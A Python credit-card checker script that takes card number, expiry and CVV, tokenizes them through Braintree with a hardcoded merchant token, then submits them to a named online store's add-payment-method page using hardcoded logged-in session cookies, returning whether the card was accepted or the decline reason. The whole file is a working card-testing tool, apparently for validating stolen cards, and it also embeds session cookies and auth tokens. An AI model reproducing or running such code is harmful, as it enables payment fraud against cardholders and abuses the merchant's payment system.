import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	import requests
	
	headers = {
	    'authority': 'payments.braintree-api.com',
	    'accept': '*/*',
	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MTM5NzA4MzAsImp0aSI6IjNkYmJhZGM3LWZmODEtNGNhNC05MjA0LTVhZTFhNGQ0Yzc4MyIsInN1YiI6ImI3am5oY2Q1czlucm14czciLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImI3am5oY2Q1czlucm14czciLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6ImJlbGxzb2ZzdGVlbHVzYWluY0NBRCJ9fQ.cTkcjQvOcKFA3qv_DZAHrQav0dsqBpE1mzV4eU6XCI4cFM4kDHr-LOS1AyU_qhahzjF-3Nd5VT1z9Yp5p6-UOw',
	    'braintree-version': '2018-05-10',
	    'content-type': 'application/json',
	    'origin': 'https://assets.braintreegateway.com',
	    'referer': 'https://assets.braintreegateway.com/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'custom',
	        'sessionId': 'be5b3e0f-e3ba-4ced-aff9-65ca8ead9f35',
	    },
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	    'variables': {
	        'input': {
	            'creditCard': {
	                'number': n,
	                'expirationMonth': mm,
	                'expirationYear': yy,
	                'cvv': cvc,
	            },
	            'options': {
	                'validate': False,
	            },
	        },
	    },
	    'operationName': 'TokenizeCreditCard',
	}
	
	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	
	tk=(response.json()["data"]["tokenizeCreditCard"]["token"])
	
	
	import requests
	
	cookies = {
	    'cf_chl_3': 'e0f304cc8abc1a4',
	    'cf_clearance': 'QZKye.lI7LJeuINl_O8yKJCLWLSix2tn8tzXs2rdS9c-1713884073-1.0.1.1-VdPAZfBP39q1plylZ0qyLOyRUYwVg3p2pzDHVb4AT9WFf_xRGjSH89uP06phmHUGYOD6Hd9m9OFF8dgN7Ah_fw',
	    'PHPSESSID': '35996149e57012e89100d1e0f7d1c5bb',
	    'fkcart_cart_qty': '0',
	    'fkcart_cart_total': '%3Cspan%20class%3D%22woocommerce-Price-amount%20amount%22%3E%3Cbdi%3E%3Cspan%20class%3D%22woocommerce-Price-currencySymbol%22%3E%24%3C%2Fspan%3E0.00%3C%2Fbdi%3E%3C%2Fspan%3E',
	    'sbjs_migrations': '1418474375998%3D1',
	    'sbjs_current_add': 'fd%3D2024-04-23%2014%3A54%3A26%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.bellsofsteel.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.bellsofsteel.com%2Fmy-account%2Fadd-payment-method%2F%3F__cf_chl_tk%3D.Uc08aGh1os0.Voblm_QEw_rZux6m7HLW6Y4YLSPSl0-1713884073-0.0.1.1-1642',
	    'sbjs_first_add': 'fd%3D2024-04-23%2014%3A54%3A26%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.bellsofsteel.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.bellsofsteel.com%2Fmy-account%2Fadd-payment-method%2F%3F__cf_chl_tk%3D.Uc08aGh1os0.Voblm_QEw_rZux6m7HLW6Y4YLSPSl0-1713884073-0.0.1.1-1642',
	    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
	    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
	    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
	    '_gcl_au': '1.1.1512373347.1713884068',
	    '_omappvp': 'J3mFnjt7IOZbiUSmTtCYy6W2e0WcUuHVlbEflCl3gfnZl1HqfsKI8pSdWLm7aSb3KMrcRy33uqZjWceMJPDldUjrm8VsmBKn',
	    '_ga': 'GA1.1.1068008039.1713884070',
	    'FPID': 'FPID2.2.zdyzYKaLEtGaon6qbVm0mm1PBSkZRi4nV3ORPk661SQ%3D.1713884070',
	    'FPLC': 'JrXIiA149AQu8I6lT8G8iVft8s%2FMykXaKd1FthdYTuB6vx5IVHPhleQ9zrbNQyHDLdu19r2wkOgGUKkMsTkj5t4BgGfzNsW7XHgFIuxx7LCmjwU7Fy4R32NAFDQa1A%3D%3D',
	    'FPAU': '1.1.1512373347.1713884068',
	    '_tt_enable_cookie': '1',
	    '_dcid': 'dcid.1.1713884115621.217647667',
	    '_ttp': 'nhMazbhAOCexDDaUMRRNp41O0kY',
	    'tracker_device': '4e684d0b-75b1-4dc2-919d-9a806287ad97',
	    'wffn_flt': '2024-4-23 8:54:37',
	    'wffn_timezone': 'Asia/Baghdad',
	    'wffn_is_mobile': 'true',
	    'wffn_browser': 'Chrome',
	    'wffn_referrer': '',
	    'wffn_fl_url': '/my-account/add-payment-method/',
	    '_fbp': 'fb.1.1713884078107.1913345559',
	    'PAPVisitorId': 'fTwntVUBwOKTWSZjxuZ9FR5Ooddt687f',
	    'PAPVisitorId': 'fTwntVUBwOKTWSZjxuZ9FR5Ooddt687f',
	    'wordpress_logged_in_25b0d5301bc68e5d70bd625439313b42': 'aakkakaka111111%7C1715093746%7C1ryi6sLm7asYIegE6ckGir55xdzVExRn4IBEUCJiuaV%7Cef430b459696cdc2b2474a92d2b07510bbf65e7f00ac000441e2bccf06c62082',
	    'wfwaf-authcookie-b716ab9f78e6c38df9608beba75bae97': '26730%7Cother%7Cread%7Cc19c6655e85773ea2b3fff170c649c46a92a59626ffe4b7b5399e72b3e82a955',
	    'sbjs_session': 'pgs%3D17%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.bellsofsteel.com%2Fmy-account%2Fadd-payment-method%2F',
	    '_omappvs': '1713884384219',
	    '__kla_id': 'eyJjaWQiOiJaR0UzTXpBM01EY3ROamswWkMwME5UUTBMVGxtTnpjdE16QXlORGhpTmpnd1lqWm0iLCIkcmVmZXJyZXIiOnsidHMiOjE3MTM4ODQwNjgsInZhbHVlIjoiaHR0cHM6Ly93d3cuYmVsbHNvZnN0ZWVsLmNvbS9teS1hY2NvdW50L2FkZC1wYXltZW50LW1ldGhvZC8/X19jZl9jaGxfdGs9LlVjMDhhR2gxb3MwLlZvYmxtX1FFd19yWnV4Nm03SExXNlk0WUxTUFNsMC0xNzEzODg0MDczLTAuMC4xLjEtMTY0MiIsImZpcnN0X3BhZ2UiOiJodHRwczovL3d3dy5iZWxsc29mc3RlZWwuY29tL215LWFjY291bnQvYWRkLXBheW1lbnQtbWV0aG9kLyJ9LCIkbGFzdF9yZWZlcnJlciI6eyJ0cyI6MTcxMzg4NDM4OCwidmFsdWUiOiJodHRwczovL3d3dy5iZWxsc29mc3RlZWwuY29tL215LWFjY291bnQvYWRkLXBheW1lbnQtbWV0aG9kLz9fX2NmX2NobF90az0uVWMwOGFHaDFvczAuVm9ibG1fUUV3X3JadXg2bTdITFc2WTRZTFNQU2wwLTE3MTM4ODQwNzMtMC4wLjEuMS0xNjQyIiwiZmlyc3RfcGFnZSI6Imh0dHBzOi8vd3d3LmJlbGxzb2ZzdGVlbC5jb20vbXktYWNjb3VudC9hZGQtcGF5bWVudC1tZXRob2QvIn0sIiRleGNoYW5nZV9pZCI6Ijhlc2JSZ2g1RHlPZU04M2w1SE8tZ0lRazg3NF80bGMtSDhsWmgyZlFnMGl1ZVR4WEpXUElMenFjWksxRHlaejUuUUJXZGo3In0=',
	    '_uetsid': '6ace57e0018111efb7cfcb6d046c2205',
	    '_uetvid': '6ad0fc40018111efb089e348832c987d',
	    'FPGSID': '1.1713884112.1713884484.G-0CLEBVT242.pq8RBZfkXuFMSVrnl91-lg',
	    '_ga_0CLEBVT242': 'GS1.1.1713884069.1.1.1713884444.0.0.2043148584',
	    'stape': '%7B%22event_id%22%3A%221713884720833_171388535302311%22%2C%22user_id%22%3A%22JrXIiA149AQu8I6lT8G8iVft8s%252FMykXaKd1FthdYTuB6vx5IVHPhleQ9zrbNQyHDLdu19r2wkOgGUKkMsTkj5t4BgGfzNsW7XHgFIuxx7LCmjwU7Fy4R32NAFDQa1A%253D%253D%22%7D',
	}
	
	headers = {
	    'authority': 'www.bellsofsteel.com',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'cache-control': 'max-age=0',
	    'content-type': 'application/x-www-form-urlencoded',
	    # 'cookie': 'cf_chl_3=e0f304cc8abc1a4; cf_clearance=QZKye.lI7LJeuINl_O8yKJCLWLSix2tn8tzXs2rdS9c-1713884073-1.0.1.1-VdPAZfBP39q1plylZ0qyLOyRUYwVg3p2pzDHVb4AT9WFf_xRGjSH89uP06phmHUGYOD6Hd9m9OFF8dgN7Ah_fw; PHPSESSID=35996149e57012e89100d1e0f7d1c5bb; fkcart_cart_qty=0; fkcart_cart_total=%3Cspan%20class%3D%22woocommerce-Price-amount%20amount%22%3E%3Cbdi%3E%3Cspan%20class%3D%22woocommerce-Price-currencySymbol%22%3E%24%3C%2Fspan%3E0.00%3C%2Fbdi%3E%3C%2Fspan%3E; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-04-23%2014%3A54%3A26%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.bellsofsteel.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.bellsofsteel.com%2Fmy-account%2Fadd-payment-method%2F%3F__cf_chl_tk%3D.Uc08aGh1os0.Voblm_QEw_rZux6m7HLW6Y4YLSPSl0-1713884073-0.0.1.1-1642; sbjs_first_add=fd%3D2024-04-23%2014%3A54%3A26%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.bellsofsteel.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.bellsofsteel.com%2Fmy-account%2Fadd-payment-method%2F%3F__cf_chl_tk%3D.Uc08aGh1os0.Voblm_QEw_rZux6m7HLW6Y4YLSPSl0-1713884073-0.0.1.1-1642; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; _gcl_au=1.1.1512373347.1713884068; _omappvp=J3mFnjt7IOZbiUSmTtCYy6W2e0WcUuHVlbEflCl3gfnZl1HqfsKI8pSdWLm7aSb3KMrcRy33uqZjWceMJPDldUjrm8VsmBKn; _ga=GA1.1.1068008039.1713884070; FPID=FPID2.2.zdyzYKaLEtGaon6qbVm0mm1PBSkZRi4nV3ORPk661SQ%3D.1713884070; FPLC=JrXIiA149AQu8I6lT8G8iVft8s%2FMykXaKd1FthdYTuB6vx5IVHPhleQ9zrbNQyHDLdu19r2wkOgGUKkMsTkj5t4BgGfzNsW7XHgFIuxx7LCmjwU7Fy4R32NAFDQa1A%3D%3D; FPAU=1.1.1512373347.1713884068; _tt_enable_cookie=1; _dcid=dcid.1.1713884115621.217647667; _ttp=nhMazbhAOCexDDaUMRRNp41O0kY; tracker_device=4e684d0b-75b1-4dc2-919d-9a806287ad97; wffn_flt=2024-4-23 8:54:37; wffn_timezone=Asia/Baghdad; wffn_is_mobile=true; wffn_browser=Chrome; wffn_referrer=; wffn_fl_url=/my-account/add-payment-method/; _fbp=fb.1.1713884078107.1913345559; PAPVisitorId=fTwntVUBwOKTWSZjxuZ9FR5Ooddt687f; PAPVisitorId=fTwntVUBwOKTWSZjxuZ9FR5Ooddt687f; wordpress_logged_in_25b0d5301bc68e5d70bd625439313b42=aakkakaka111111%7C1715093746%7C1ryi6sLm7asYIegE6ckGir55xdzVExRn4IBEUCJiuaV%7Cef430b459696cdc2b2474a92d2b07510bbf65e7f00ac000441e2bccf06c62082; wfwaf-authcookie-b716ab9f78e6c38df9608beba75bae97=26730%7Cother%7Cread%7Cc19c6655e85773ea2b3fff170c649c46a92a59626ffe4b7b5399e72b3e82a955; sbjs_session=pgs%3D17%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.bellsofsteel.com%2Fmy-account%2Fadd-payment-method%2F; _omappvs=1713884384219; __kla_id=eyJjaWQiOiJaR0UzTXpBM01EY3ROamswWkMwME5UUTBMVGxtTnpjdE16QXlORGhpTmpnd1lqWm0iLCIkcmVmZXJyZXIiOnsidHMiOjE3MTM4ODQwNjgsInZhbHVlIjoiaHR0cHM6Ly93d3cuYmVsbHNvZnN0ZWVsLmNvbS9teS1hY2NvdW50L2FkZC1wYXltZW50LW1ldGhvZC8/X19jZl9jaGxfdGs9LlVjMDhhR2gxb3MwLlZvYmxtX1FFd19yWnV4Nm03SExXNlk0WUxTUFNsMC0xNzEzODg0MDczLTAuMC4xLjEtMTY0MiIsImZpcnN0X3BhZ2UiOiJodHRwczovL3d3dy5iZWxsc29mc3RlZWwuY29tL215LWFjY291bnQvYWRkLXBheW1lbnQtbWV0aG9kLyJ9LCIkbGFzdF9yZWZlcnJlciI6eyJ0cyI6MTcxMzg4NDM4OCwidmFsdWUiOiJodHRwczovL3d3dy5iZWxsc29mc3RlZWwuY29tL215LWFjY291bnQvYWRkLXBheW1lbnQtbWV0aG9kLz9fX2NmX2NobF90az0uVWMwOGFHaDFvczAuVm9ibG1fUUV3X3JadXg2bTdITFc2WTRZTFNQU2wwLTE3MTM4ODQwNzMtMC4wLjEuMS0xNjQyIiwiZmlyc3RfcGFnZSI6Imh0dHBzOi8vd3d3LmJlbGxzb2ZzdGVlbC5jb20vbXktYWNjb3VudC9hZGQtcGF5bWVudC1tZXRob2QvIn0sIiRleGNoYW5nZV9pZCI6Ijhlc2JSZ2g1RHlPZU04M2w1SE8tZ0lRazg3NF80bGMtSDhsWmgyZlFnMGl1ZVR4WEpXUElMenFjWksxRHlaejUuUUJXZGo3In0=; _uetsid=6ace57e0018111efb7cfcb6d046c2205; _uetvid=6ad0fc40018111efb089e348832c987d; FPGSID=1.1713884112.1713884484.G-0CLEBVT242.pq8RBZfkXuFMSVrnl91-lg; _ga_0CLEBVT242=GS1.1.1713884069.1.1.1713884444.0.0.2043148584; stape=%7B%22event_id%22%3A%221713884720833_171388535302311%22%2C%22user_id%22%3A%22JrXIiA149AQu8I6lT8G8iVft8s%252FMykXaKd1FthdYTuB6vx5IVHPhleQ9zrbNQyHDLdu19r2wkOgGUKkMsTkj5t4BgGfzNsW7XHgFIuxx7LCmjwU7Fy4R32NAFDQa1A%253D%253D%22%7D',
	    'origin': 'https://www.bellsofsteel.com',
	    'referer': 'https://www.bellsofsteel.com/my-account/add-payment-method/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-arch': '""',
	    'sec-ch-ua-bitness': '""',
	    'sec-ch-ua-full-version': '"124.0.6327.2"',
	    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.2"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-model': '"TECNO BD4a"',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-ch-ua-platform-version': '"11.0.0"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	data = {
	    'payment_method': 'braintree_credit_card',
	    'wc-braintree-credit-card-card-type': 'visa',
	    'wc-braintree-credit-card-3d-secure-enabled': '',
	    'wc-braintree-credit-card-3d-secure-verified': '',
	    'wc-braintree-credit-card-3d-secure-order-total': '0.00',
	    'wc_braintree_credit_card_payment_nonce': tk,
	    'wc_braintree_device_data': '{"correlation_id":"3f2d9a882ea1e4bd18bb729aacd2e2aa"}',
	    'wc-braintree-credit-card-tokenize-payment-method': 'true',
	    'woocommerce-add-payment-method-nonce': '3fe78781cc',
	    '_wp_http_referer': '/my-account/add-payment-method/',
	    'woocommerce_add_payment_method': '1',
	}
	
	response = requests.post(
	    'https://www.bellsofsteel.com/my-account/add-payment-method/',
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	text=(response.text)
	import re
	pattern = r"Reason: (.+?)\s*</li>"
	
	match = re.search(pattern, text)
	if match:
	    duplicate_message = match.group(1)
	    return duplicate_message
	else:
		if 'Nice! New payment method added' in text:
			return 'Nice! New payment method added.'
		elif 'risk_threshold' in text:
			return 'risk_threshold'
		else:
			return 'risk_threshold'
	
